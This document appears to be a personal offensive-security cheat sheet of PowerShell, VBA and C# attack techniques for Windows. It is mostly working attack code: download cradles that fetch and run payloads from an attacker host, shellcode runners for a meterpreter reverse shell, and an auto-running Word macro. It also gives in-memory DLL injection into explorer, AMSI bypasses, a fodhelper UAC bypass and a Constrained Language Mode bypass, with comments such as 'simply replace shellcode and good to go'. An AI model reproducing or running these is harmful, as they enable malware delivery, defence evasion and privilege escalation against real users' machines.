---
## POWERSHELL DOWNLOAD CRADLE

//.NET powershell downloadfile method

```
(New-Object Net.WebClient).DownloadFile('http://10.10.xx.x/msfstaged.exe', ‘msfstaged.exe’)
```

//`iex downloadstring` also works -- script will be automatically imported (loaded in memory) -- but signature heavy
// `iwr -useb` works like `iex downloadstring` -- but less signature heavy from my experience



---
## CALLING WIN32 APIs FROM POWERSHELL

```
$User32 = @"
using System;
using System.Runtime.InteropServices;

public class User32 {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int MessageBox(IntPtr hWnd, String text, 
        String caption, int options);
}
"@

Add-Type $User32

[User32]::MessageBox(0, "This is an alert", "MyBox", 0)
```


//Note that our Microsoft Office 2016 version of Word is a 32-bit process, which means that PowerShell will also launch as a 32-bit process. 
//In order to properly simulate and test this scenario, we should use the 32-bit version of PowerShell ISE located at C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe




---
## SHELLCODE RUNNER WITH POWERSHELL WITH ADD-TYPE

```
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    
}
"@

Add-Type $Kernel32

[Byte[]] $buf = <SHELLCODE>

$size = $buf.Length

[IntPtr]$addr = [Kernel32]::VirtualAlloc(0, $size, 0x3000, 0x40);

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)

$thandle = [Kernel32]::CreateThread(0,0, $addr, 0, 0, 0);

[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```


//running this script directly on x86 powershell and we'd get a meterpreter back

//shellcode from `msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.xx.xxx LPORT=443 EXITFUNC=thread -f ps1`

//make sure multi/handler is set up properly

//to run with MACRO, save script into .ps1 and ran as download cradle

//waitforsingleobject is also imported to prevent premature termination of powershell


```
Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object Net.WebClient).DownloadString('http://192.168.xx.xxx/pwrshrunner.ps1') | IEX"
    Shell str, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

//nonetheless this code isnt adequate --  specifically Add-Type calls csc compiler -- which leaves traces on hard drive despite temporary AV would still flag it







---
## WIN32 API LOOKUP FUNCTION VIA POWERSHELL

```
function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}
```





---
## POWERSHELL SHELLCODE RUNNER VIA REFLECTION

```
function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}

$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = <SHELLCODE>

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
```


//simply replace shellcode and good to go





---
## SYSTEM INTEGRITY PROXY

```
New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
$keys = Get-ChildItem 'HKU:\'
ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = $key.Name.substring(10);break}}
$proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://$proxyAddr")
$wc = new-object system.net.WebClient
$wc.DownloadString("http://192.168.xx.xxx/run2.ps1")
```

//change to kali ip and good to go



---
## POWERSHELL REFLECTIVE LOAD

```
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.xx.xxx/ClassLibrary1.dll')

$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

//download .dll that has our csharp shellcode into memory and execute in memory





---
## REFLECTIVE DLL INJECTION IN POWERSHELL


//need invoke-reflectivepeinjection.ps1

```
$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.xx.xxx/met.dll')
$procid = (Get-Process -Name explorer).Id

Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1

Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```

//this executes completely in memory -- no writing to disk



---
## POWERSHELL REFLECTIVE ONE-LINER AMSI BYPASSER

```
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```


---
## POWERSHELL AMSI BYPASS VIA PATCHING


```
function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}

[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
$oldProtectionBuffer = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)

$buf = [Byte[]] (0x48, 0x31, 0xC0)  

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)  

$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)  
```


//copy paste and exec it directly on powershell command prompt

OR

//exec it via downloadstring iex



---
## FODHELPER UAC BYPASS -- FOR HIGH INTEG POWERSHELL


```
New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://192.168.xx.xxx/run.txt') | IEX" -Force
```
```
New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
```
```
C:\Windows\System32\fodhelper.exe
```

//we don't necessarily have to run only .ps1 or .txt

//we could use downloadfile instead then add another command after ; to exec the payload -- such as HOLLOWNUMA .exe .js whatever


OR

FODPRIVESC.ps1

```
function RegStuff {
$cmd = "C:\Windows\Tasks\tool.exe -enc
aQBlAHgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4A....HMAMQAnACkA"
copy C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe C:\Windows\Tasks\tool.exe
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -
Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value
$cmd -Force
}
function RunPrivEsc {
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
Start-Sleep -s 2
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -ErrorAction SilentlyContinue
}
RegStuff
```

//$cmd has base64-encoded iex download cradle to grab our reflectivepwrshell

//iex downloadstring our fodprivesc.ps1 into memory

//then on powershell prompt -- run RunPrivEsc function to start the chain reaction


---
## POWERSHELL SHELLCODE RUNNER + CUSTOM RUNSPACE -- BYPASSING CONSTRAINED LANGUAGE MODE (CLM)


```
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.xx.xxx/runner-210.ps1') | IEX"; ps.AddScript(cmd);
            
            ps.Invoke();
            rs.Close();
        }
    }
}
```

//be sure to locate System.Management.Automation.Runspaces if it's not found in visual studio








